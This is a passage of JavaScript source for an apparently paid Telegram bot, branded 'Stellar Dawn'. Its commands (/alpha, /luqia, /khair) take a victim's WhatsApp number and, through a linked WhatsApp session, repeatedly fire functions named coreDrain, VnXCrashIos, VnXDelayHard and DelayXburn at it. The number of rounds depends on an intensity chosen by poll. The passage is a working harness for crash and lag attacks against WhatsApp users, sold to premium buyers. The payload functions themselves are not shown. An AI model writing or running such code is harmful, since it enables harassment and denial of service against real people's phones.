        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }

    const imageMsg = await bot.sendPhoto(chatId, randomImage, {
        caption: `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⏳ 𝖬𝖾𝗇𝗎𝗇𝗀𝗀𝗎 𝖯𝗂𝗅𝗂𝗁𝖺𝗇
│─ Date   : ${date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
        `,
        parse_mode: "HTML"
    });

    const pollMessage = await bot.sendPoll(chatId, 
        `ПОЖАЛУЙСТА, ВЫБЕРИТЕ`,
        ['30%', '50%', '70%'],
        {
            is_anonymous: false,
            allows_multiple_answers: false,
            reply_to_message_id: imageMsg.message_id,
            open_period: 60
        }
    );

    activePolls.set(pollMessage.poll.id, {
        chatId,
        userId,
        targetNumber: formattedNumber,
        target,
        videoMessageId: imageMsg.message_id,
        pollMessageId: pollMessage.message_id,
        pollId: pollMessage.poll.id,
        date,
        randomImage
    });

    setTimeout(async () => {
        try {
            if (!activePolls.has(pollMessage.poll.id)) return;
            await bot.deleteMessage(chatId, pollMessage.message_id);
            await bot.editMessageCaption(
                `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⌛ 𝖤𝗑𝗉𝗂𝗋𝖾𝖽
│─ Date   : ${date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
                `,
                {
                    chat_id: chatId,
                    message_id: imageMsg.message_id,
                    parse_mode: "HTML"
                }
            );
            activePolls.delete(pollMessage.poll.id);
        } catch (err) {
            console.log('Error cleanup poll:', err);
        }
    }, 60000);
});

bot.on('poll_answer', async (pollAnswer) => {
    const pollId = pollAnswer.poll_id;
    const userId = pollAnswer.user.id;
    const selectedOptions = pollAnswer.option_ids;

    const pollData = activePolls.get(pollId);
    if (!pollData) return;

    if (userId !== pollData.userId) {
        return bot.sendMessage(pollData.chatId, 
            `⚠️ @${pollAnswer.user.username} — 𝖧𝖺𝗇𝗒𝖺 𝗎𝗇𝗍𝗎𝗄 𝗎𝗌𝖾𝗋 𝗒𝖺𝗇𝗀 𝗋𝖾𝗊𝗎𝖾𝗌𝗍!`
        );
    }

    const optionId = selectedOptions[0];
    let action;
    switch(optionId) {
        case 0: action = '30%'; break;
        case 1: action = '50%'; break;
        case 2: action = '70%'; break;
        default: return;
    }

    try { await bot.deleteMessage(pollData.chatId, pollData.pollMessageId); } 
    catch (err) { console.log('Error deleting poll:', err); }

    if (action === 'cancel') {
        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio  : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖡𝖺𝗍𝖺𝗅
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
                }
            }
        );
        activePolls.delete(pollId);
        return;
    }

    await bot.editMessageCaption(
        `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio   : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
        `,
        {
            chat_id: pollData.chatId,
            message_id: pollData.videoMessageId,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
            }
        }
    );

    try {
        const sock = sessions.values().next().value;
        const target = `${pollData.targetNumber}@s.whatsapp.net`;

        if (action === '30%') {
            for (let i = 0; i < 5; i++) {
                await coreDrain(sock, target);
                await sleep(500);
                await coreDrain(sock, target);
                await sleep(500);
            }
        } else if (action === '50%') {
            for (let i = 0; i < 15; i++) {
                await coreDrain(sock, target);
                await sleep(500);
                await coreDrain(sock, target);
                await sleep(500);
                await coreDrain(sock, target);
                await sleep(500);
            }
        }
        else if (action === '70%') {
            for (let i = 0; i < 20; i++) {
                await coreDrain(sock, target);
                await sleep(500);
                await coreDrain(sock, target);
                await sleep(500);
                await coreDrain(sock, target);
                await sleep(500);
                }
                }

        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio  : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝗌
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
                }
            }
        );

    } catch (err) {
        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖦𝖺𝗀𝖺𝗅
│─ Error  : ${err.message}
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML"
            }
        );
    }

    activePolls.delete(pollId);
});
bot.onText(/\/alpha(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /nezha [nomor]\nContoh: /nezha 628888888888`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: `<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>\n❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }

    const imageMsg = await bot.sendPhoto(chatId, randomImage, {
        caption: `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⏳ 𝖬𝖾𝗇𝗎𝗇𝗀𝗀𝗎 𝖯𝗂𝗅𝗂𝗁𝖺𝗇
│─ Date   : ${date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
        `,
        parse_mode: "HTML"
    });

    const pollMessage = await bot.sendPoll(chatId, 
        `ПОЖАЛУЙСТА, ВЫБЕРИТЕ`,
        ['30%', '50%', '70%'],
        {
            is_anonymous: false,
            allows_multiple_answers: false,
            reply_to_message_id: imageMsg.message_id,
            open_period: 60
        }
    );

    activePolls.set(pollMessage.poll.id, {
        chatId,
        userId,
        targetNumber: formattedNumber,
        target,
        videoMessageId: imageMsg.message_id,
        pollMessageId: pollMessage.message_id,
        pollId: pollMessage.poll.id,
        date,
        randomImage
    });

    setTimeout(async () => {
        try {
            if (!activePolls.has(pollMessage.poll.id)) return;
            await bot.deleteMessage(chatId, pollMessage.message_id);
            await bot.editMessageCaption(
                `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⌛ 𝖤𝗑𝗉𝗂𝗋𝖾𝖽
│─ Date   : ${date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
                `,
                {
                    chat_id: chatId,
                    message_id: imageMsg.message_id,
                    parse_mode: "HTML"
                }
            );
            activePolls.delete(pollMessage.poll.id);
        } catch (err) {
            console.log('Error cleanup poll:', err);
        }
    }, 60000);
});

bot.on('poll_answer', async (pollAnswer) => {
    const pollId = pollAnswer.poll_id;
    const userId = pollAnswer.user.id;
    const selectedOptions = pollAnswer.option_ids;

    const pollData = activePolls.get(pollId);
    if (!pollData) return;

    if (userId !== pollData.userId) {
        return bot.sendMessage(pollData.chatId, 
            `⚠️ @${pollAnswer.user.username} — 𝖧𝖺𝗇𝗒𝖺 𝗎𝗇𝗍𝗎𝗄 𝗎𝗌𝖾𝗋 𝗒𝖺𝗇𝗀 𝗋𝖾𝗊𝗎𝖾𝗌𝗍!`
        );
    }

    const optionId = selectedOptions[0];
    let action;
    switch(optionId) {
        case 0: action = '30%'; break;
        case 1: action = '50%'; break;
        case 2: action = '70%'; break;
        default: return;
    }

    try { await bot.deleteMessage(pollData.chatId, pollData.pollMessageId); } 
    catch (err) { console.log('Error deleting poll:', err); }

    if (action === 'cancel') {
        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio  : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖡𝖺𝗍𝖺𝗅
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
                }
            }
        );
        activePolls.delete(pollId);
        return;
    }

    await bot.editMessageCaption(
        `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio   : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
        `,
        {
            chat_id: pollData.chatId,
            message_id: pollData.videoMessageId,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
            }
        }
    );

    try {
        const sock = sessions.values().next().value;
        const target = `${pollData.targetNumber}@s.whatsapp.net`;

        if (action === '30%') {
            for (let i = 0; i < 5; i++) {
                await VnXDelayHard(sock, target, ptcp = true);
                await sleep(500);
                await VnXDelayHard(sock, target, ptcp = true);
                await sleep(500);
            }
        } else if (action === '50%') {
            for (let i = 0; i < 15; i++) {
                await VnXDelayHard(sock, target, ptcp = true);
                await sleep(500);
await VnXDelayHard(sock, target, ptcp = true);
                await sleep(500);
                
            }
        }
        else if (action === '70%') {
            for (let i = 0; i < 20; i++) {
await VnXDelayHard(sock, target, ptcp = true);
                await sleep(500);
                await VnXDelayHard(sock, target, ptcp = true);
                await sleep(500);
               
                }
                }

        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio  : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝗌
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
                }
            }
        );

    } catch (err) {
        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖦𝖺𝗀𝖺𝗅
│─ Error  : ${err.message}
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML"
            }
        );
    }

    activePolls.delete(pollId);
});
bot.onText(/\/luqia(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /nezha [nomor]\nContoh: /nezha 628888888888`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const target = `${formattedNumber}@s.whatsapp.net`;
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: `<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>\n❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }

    const imageMsg = await bot.sendPhoto(chatId, randomImage, {
        caption: `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⏳ 𝖬𝖾𝗇𝗎𝗇𝗀𝗀𝗎 𝖯𝗂𝗅𝗂𝗁𝖺𝗇
│─ Date   : ${date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
        `,
        parse_mode: "HTML"
    });

    const pollMessage = await bot.sendPoll(chatId, 
        `ПОЖАЛУЙСТА, ВЫБЕРИТЕ`,
        ['30%', '50%', '70%'],
        {
            is_anonymous: false,
            allows_multiple_answers: false,
            reply_to_message_id: imageMsg.message_id,
            open_period: 60
        }
    );

    activePolls.set(pollMessage.poll.id, {
        chatId,
        userId,
        targetNumber: formattedNumber,
        target,
        videoMessageId: imageMsg.message_id,
        pollMessageId: pollMessage.message_id,
        pollId: pollMessage.poll.id,
        date,
        randomImage
    });

    setTimeout(async () => {
        try {
            if (!activePolls.has(pollMessage.poll.id)) return;
            await bot.deleteMessage(chatId, pollMessage.message_id);
            await bot.editMessageCaption(
                `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⌛ 𝖤𝗑𝗉𝗂𝗋𝖾𝖽
│─ Date   : ${date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
                `,
                {
                    chat_id: chatId,
                    message_id: imageMsg.message_id,
                    parse_mode: "HTML"
                }
            );
            activePolls.delete(pollMessage.poll.id);
        } catch (err) {
            console.log('Error cleanup poll:', err);
        }
    }, 60000);
});

bot.on('poll_answer', async (pollAnswer) => {
    const pollId = pollAnswer.poll_id;
    const userId = pollAnswer.user.id;
    const selectedOptions = pollAnswer.option_ids;

    const pollData = activePolls.get(pollId);
    if (!pollData) return;

    if (userId !== pollData.userId) {
        return bot.sendMessage(pollData.chatId, 
            `⚠️ @${pollAnswer.user.username} — 𝖧𝖺𝗇𝗒𝖺 𝗎𝗇𝗍𝗎𝗄 𝗎𝗌𝖾𝗋 𝗒𝖺𝗇𝗀 𝗋𝖾𝗊𝗎𝖾𝗌𝗍!`
        );
    }

    const optionId = selectedOptions[0];
    let action;
    switch(optionId) {
        case 0: action = '30%'; break;
        case 1: action = '50%'; break;
        case 2: action = '70%'; break;
        default: return;
    }

    try { await bot.deleteMessage(pollData.chatId, pollData.pollMessageId); } 
    catch (err) { console.log('Error deleting poll:', err); }

    if (action === 'cancel') {
        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio  : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖡𝖺𝗍𝖺𝗅
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
                }
            }
        );
        activePolls.delete(pollId);
        return;
    }

    await bot.editMessageCaption(
        `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio   : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
        `,
        {
            chat_id: pollData.chatId,
            message_id: pollData.videoMessageId,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
            }
        }
    );

    try {
        const sock = sessions.values().next().value;
        const target = `${pollData.targetNumber}@s.whatsapp.net`;

        if (action === '30%') {
            for (let i = 0; i < 5; i++) {
                await VnXCrashIos(sock, target);
                await sleep(500);
                await VnXCrashIos(sock, target);
                await sleep(500);
            }
        } else if (action === '50%') {
            for (let i = 0; i < 15; i++) {
                await VnXCrashIos(sock, target);
                await sleep(500);
                await VnXCrashIos(sock, target);
                await sleep(500);
                
            }
        }
        else if (action === '70%') {
            for (let i = 0; i < 20; i++) {
                await VnXCrashIos(sock, target);
                await sleep(500);
                await VnXCrashIos(sock, target);
                await sleep(500);
                await coreDrain(sock, target);
                await sleep(500);
                }
                }

        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio  : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝗌
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
                }
            }
        );

    } catch (err) {
        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖦𝖺𝗀𝖺𝗅
│─ Error  : ${err.message}
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML"
            }
        );
    }

    activePolls.delete(pollId);
});
bot.onText(/\/khair(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
            `❌ *Format salah!*\n\nGunakan: /nezha [nomor]\nContoh: /nezha 628888888888`,
            { parse_mode: "Markdown" }
        );
    }

    const targetNumber = match[1];
    const randomImage = getRandomImage();
    const date = getCurrentDate();
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");

    const target = `${formattedNumber}@s.whatsapp.net`;
    const isUserPremium = premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date());

    if (!isUserPremium) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: `<blockquote>(本) 𝖲𝗍𝖾𝗅𝗅𝖺𝗋 - Dawn</blockquote>\n❌ Akses ditolak. Fitur ini hanya untuk user premium.`,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[{ text: "𝖠𝗎𝗍𝗁𝗈𝗋", url: "https://t.me/SonKairn" }]]
            }
        });
    }

    if (sessions.size === 0) {
        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
    }

    const imageMsg = await bot.sendPhoto(chatId, randomImage, {
        caption: `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⏳ 𝖬𝖾𝗇𝗎𝗇𝗀𝗀𝗎 𝖯𝗂𝗅𝗂𝗁𝖺𝗇
│─ Date   : ${date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
        `,
        parse_mode: "HTML"
    });

    const pollMessage = await bot.sendPoll(chatId, 
        `ПОЖАЛУЙСТА, ВЫБЕРИТЕ`,
        ['30%', '50%', '70%'],
        {
            is_anonymous: false,
            allows_multiple_answers: false,
            reply_to_message_id: imageMsg.message_id,
            open_period: 60
        }
    );

    activePolls.set(pollMessage.poll.id, {
        chatId,
        userId,
        targetNumber: formattedNumber,
        target,
        videoMessageId: imageMsg.message_id,
        pollMessageId: pollMessage.message_id,
        pollId: pollMessage.poll.id,
        date,
        randomImage
    });

    setTimeout(async () => {
        try {
            if (!activePolls.has(pollMessage.poll.id)) return;
            await bot.deleteMessage(chatId, pollMessage.message_id);
            await bot.editMessageCaption(
                `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${formattedNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ⌛ 𝖤𝗑𝗉𝗂𝗋𝖾𝖽
│─ Date   : ${date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
                `,
                {
                    chat_id: chatId,
                    message_id: imageMsg.message_id,
                    parse_mode: "HTML"
                }
            );
            activePolls.delete(pollMessage.poll.id);
        } catch (err) {
            console.log('Error cleanup poll:', err);
        }
    }, 60000);
});

bot.on('poll_answer', async (pollAnswer) => {
    const pollId = pollAnswer.poll_id;
    const userId = pollAnswer.user.id;
    const selectedOptions = pollAnswer.option_ids;

    const pollData = activePolls.get(pollId);
    if (!pollData) return;

    if (userId !== pollData.userId) {
        return bot.sendMessage(pollData.chatId, 
            `⚠️ @${pollAnswer.user.username} — 𝖧𝖺𝗇𝗒𝖺 𝗎𝗇𝗍𝗎𝗄 𝗎𝗌𝖾𝗋 𝗒𝖺𝗇𝗀 𝗋𝖾𝗊𝗎𝖾𝗌𝗍!`
        );
    }

    const optionId = selectedOptions[0];
    let action;
    switch(optionId) {
        case 0: action = '30%'; break;
        case 1: action = '50%'; break;
        case 2: action = '70%'; break;
        default: return;
    }

    try { await bot.deleteMessage(pollData.chatId, pollData.pollMessageId); } 
    catch (err) { console.log('Error deleting poll:', err); }

    if (action === 'cancel') {
        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio  : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖡𝖺𝗍𝖺𝗅
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
                }
            }
        );
        activePolls.delete(pollId);
        return;
    }

    await bot.editMessageCaption(
        `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio   : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
        `,
        {
            chat_id: pollData.chatId,
            message_id: pollData.videoMessageId,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
            }
        }
    );

    try {
        const sock = sessions.values().next().value;
        const target = `${pollData.targetNumber}@s.whatsapp.net`;

        if (action === '30%') {
            for (let i = 0; i < 5; i++) {
                await DelayXburn(sock, target);
                await sleep(500);
                  await DelayXburn(sock, target);
                await sleep(500);
            }
        } else if (action === '50%') {
            for (let i = 0; i < 15; i++) {
                  await DelayXburn(sock, target);
                await sleep(500);
                  await DelayXburn(sock, target);
                await sleep(500);
                  await DelayXburn(sock, target);
                await sleep(500);
            }
        }
        else if (action === '70%') {
            for (let i = 0; i < 20; i++) {
                  await DelayXburn(sock, target);
                await sleep(500);
                  await DelayXburn(sock, target);
                await sleep(500);
                  await DelayXburn(sock, target);
                await sleep(500);
                }
                }

        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ Rasio  : ${action.toUpperCase()}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝗌
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[{ text: "Проверь", url: `https://wa.me/${pollData.targetNumber}` }]]
                }
            }
        );

    } catch (err) {
        await bot.editMessageCaption(
            `
<pre>ＳＴＥＬＬＡＲ ─ ＤＡＷＮ</pre>
┌────────────────────────┐
│─ Target : ${pollData.targetNumber}
│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : ❌ 𝖦𝖺𝗀𝖺𝗅
│─ Error  : ${err.message}
│─ Date   : ${pollData.date}
└────────────────────────┘
 ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
            `,
            {
                chat_id: pollData.chatId,
                message_id: pollData.videoMessageId,
                parse_mode: "HTML"
            }
        );
    }

    activePolls.delete(pollId);
});
bot.onText(/\/great(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, 
